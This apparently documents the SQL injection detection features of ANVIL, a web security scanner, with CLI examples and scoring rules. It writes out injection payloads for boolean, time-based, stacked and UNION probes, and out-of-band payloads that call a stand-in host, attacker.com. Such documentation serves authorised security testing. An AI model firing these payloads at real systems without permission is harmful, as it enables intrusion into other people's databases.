# ANVIL SQL Injection Detection

Comprehensive guide to ANVIL's SQL injection detection capabilities.

## Table of Contents

- [Overview](#overview)
- [Detection Techniques](#detection-techniques)
- [How Detection Works](#how-detection-works)
- [Payload Files](#payload-files)
- [Confidence Scoring](#confidence-scoring)
- [Database Fingerprinting](#database-fingerprinting)
- [Advanced Scenarios](#advanced-scenarios)
- [Limitations](#limitations)

---

## Overview

ANVIL implements multiple SQL injection detection techniques comparable to professional tools like sqlmap and Burp Suite Pro. The detection engine uses:

- **Boolean-based inference** - Comparing TRUE/FALSE responses
- **Error-based detection** - Analyzing SQL error messages
- **Time-based blind** - Statistical timing analysis
- **Second-order detection** - Multi-stage injection workflows
- **Out-of-band (OOB)** - DNS/HTTP callback detection

---

## Detection Techniques

### Boolean-Based Detection (`--sqli`)

Injects TRUE and FALSE conditions and compares response differences.

**How it works:**
1. Send baseline request
2. Inject TRUE payload (e.g., `' OR '1'='1`)
3. Inject FALSE payload (e.g., `' AND '1'='2`)
4. Compare response lengths, content, and status codes

**Indicators:**
- Response length differs >5% between TRUE/FALSE
- Content similarity <80% between TRUE/FALSE
- Status code differences

**CLI:**
```bash
anvil --target https://example.com --param id --sqli
```

---

### Error-Based Detection (`--sqli`)

Detects SQL errors in responses indicating injection points.

**Detected Error Patterns:**
| Database | Error Indicators |
|----------|-----------------|
| MySQL | `SQL syntax`, `mysql_fetch`, `MariaDB` |
| PostgreSQL | `PostgreSQL`, `PgException`, `ERROR:` |
| MSSQL | `SQLSTATE`, `Microsoft SQL Server` |
| Oracle | `ORA-`, `Oracle error` |
| SQLite | `SQLite`, `sqlite3` |

**CLI:**
```bash
anvil --target https://example.com --param id --sqli
```

---

### Time-Based Blind Detection (`--time-sqli`)

Uses timing delays to detect blind SQL injection.

**How it works:**
1. Measure baseline response times (6 samples)
2. Inject time-delay payloads (e.g., `SLEEP(2)`, `WAITFOR DELAY`)
3. Measure injected response times
4. Calculate statistical variance and signal-to-noise ratio

**Payloads by Database:**
```
MySQL:    ' OR SLEEP(2)--
MSSQL:    '; WAITFOR DELAY '0:0:2'--
PostgreSQL: '; SELECT pg_sleep(2)--
Oracle:   ' OR DBMS_LOCK.SLEEP(2)--
```

**Configuration:**
| Option | Description | Default |
|--------|-------------|---------|
| `--time-samples` | Samples per measurement | 6 |
| `--time-delay` | Delay in seconds | 2 |

**CLI:**
```bash
anvil --target https://example.com --param id --time-sqli
anvil --target https://example.com --param id --time-sqli --time-delay 3
```

---

### Stacked Queries Detection (`--stacked`)

Detects ability to execute multiple SQL statements.

**Payloads:**
```
'; SELECT 1--
'; SELECT SLEEP(2)--
'; INSERT INTO...--
```

**CLI:**
```bash
anvil --target https://example.com --param id --stacked
```

---

### Out-of-Band Detection (`--oob`)

Uses external callbacks to detect blind injection.

**Requires:** A callback domain you control to receive DNS/HTTP requests.

**Payloads:**
```
MySQL:    LOAD_FILE('\\\\attacker.com\\a')
MSSQL:    EXEC xp_dirtree '\\\\attacker.com\\a'
Oracle:   UTL_HTTP.REQUEST('http://attacker.com/')
```

**CLI:**
```bash
anvil --target https://example.com --param id \
      --oob --oob-callback attacker.com
```

---

### Second-Order Detection

Detects injection where payload is stored and triggered later.

**Scenario:**
1. Inject payload on endpoint A (e.g., profile update)
2. Payload is stored in database
3. Payload triggers on endpoint B (e.g., admin view)

**CLI:**
```bash
anvil --target https://example.com/update \
      --trigger-url https://example.com/view \
      --param field_name \
      --sqli
```

---

## How Detection Works

### Request Flow

```
┌─────────────────────────────────────────────────────────────┐
│                    ANVIL SQLi Engine                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. BASELINE REQUEST                                        │
│     └─→ GET /page.php?id=1                                  │
│         ← Response: 200 OK, 4500 bytes                      │
│                                                             │
│  2. TRUE PAYLOAD                                            │
│     └─→ GET /page.php?id=1' OR '1'='1                       │
│         ← Response: 200 OK, 4800 bytes (+300)               │
│                                                             │
│  3. FALSE PAYLOAD                                           │
│     └─→ GET /page.php?id=1' AND '1'='2                      │
│         ← Response: 200 OK, 4500 bytes (same)               │
│                                                             │
│  4. ANALYSIS                                                │
│     └─→ TRUE ≠ FALSE = POTENTIAL SQLi                       │
│         Confidence: 50% (body length diff)                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Detection Pipeline

```
Input URL + Parameter
        │
        ▼
┌───────────────────┐
│  Baseline Request │
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│  Inject Payloads  │──→ TRUE payloads
└─────────┬─────────┘──→ FALSE payloads
          │
          ▼
┌───────────────────┐
│ Response Analysis │
├───────────────────┤
│ • Status codes    │
│ • Body length     │
│ • Body content    │
│ • SQL errors      │
│ • Response time   │
└─────────┬─────────┘
          │
          ▼
┌───────────────────┐
│ Confidence Score  │
└─────────┬─────────┘
          │
          ▼
    SQLi Result
```

---

## Payload Files

ANVIL loads payloads from `payloads/sqli/`:

| File | Purpose |
|------|---------|
| `boolean.txt` | Boolean/Error-based payloads |
| `time.txt` | Time-based delay payloads |
| `stacked.txt` | Stacked queries payloads |
| `oob.txt` | Out-of-band payloads |

**Custom Payloads:**
Add your own payloads to these files, one per line.

```bash
# payloads/sqli/boolean.txt
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
' OR 1=1--
```

---

## Confidence Scoring

ANVIL assigns confidence scores based on multiple indicators:

| Indicator | Confidence Boost |
|-----------|-----------------|
| SQL error in response | +40% |
| Status code difference | +30% |
| Body length diff >5% | +30% |
| Content similarity <80% | +20% |

**Severity Levels:**
| Confidence | Severity |
|------------|----------|
| ≥90% | CRITICAL |
| ≥70% | HIGH |
| ≥50% | MEDIUM |
| <50% | LOW |

---

## Database Fingerprinting

ANVIL automatically identifies the database type from:

1. **Error messages** - Unique error patterns
2. **Response behavior** - DB-specific syntax
3. **Timing characteristics** - Sleep function behavior

**Supported Databases:**
- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

---

## Advanced Scenarios

### Numeric Context (No Quotes)

When parameter is used in numeric context:
```sql
SELECT * FROM users WHERE id = [INPUT]
```

ANVIL uses numeric payloads:
```
1 OR 1=1
1 AND 1=2
1 UNION SELECT NULL--
```

### String Context (With Quotes)

When parameter is in string context:
```sql
SELECT * FROM users WHERE name = '[INPUT]'
```

ANVIL uses quote-based payloads:
```
' OR '1'='1
' AND '1'='2
' UNION SELECT NULL--'
```

### POST-Based Injection

```bash
anvil --target https://example.com/search \
      --param query \
      --method POST \
      --extra-data "submit=Search" \
      --sqli
```

### Second-Order Injection

```bash
# Payload stored via profile update
# Triggered when admin views profile
anvil --target https://example.com/profile/update \
      --trigger-url https://example.com/admin/user/view \
      --param nickname \
      --method POST \
      --sqli
```

---

## Limitations

1. **WAF Bypass** - ANVIL does not implement WAF evasion techniques
2. **Complex Payloads** - No automatic payload mutation/encoding
3. **Blind Data Extraction** - Exploitation requires manual follow-up
4. **JavaScript Rendering** - Does not execute JavaScript
5. **CAPTCHA** - Cannot bypass CAPTCHA-protected forms

---

## Best Practices

1. **Start with `--sqli`** - Boolean/Error detection is fastest
2. **Use `--time-sqli` for blind** - When no visible response difference
3. **Specify `--param`** - Direct testing is more accurate than crawling
4. **Adjust `--rate`** - Lower rate for sensitive targets
5. **Use `--cookie`** - For authenticated testing
6. **Review manually** - Always verify findings manually

---

## See Also

- [USAGE.md](USAGE.md) - Complete CLI reference
- [architecture.md](architecture.md) - System design

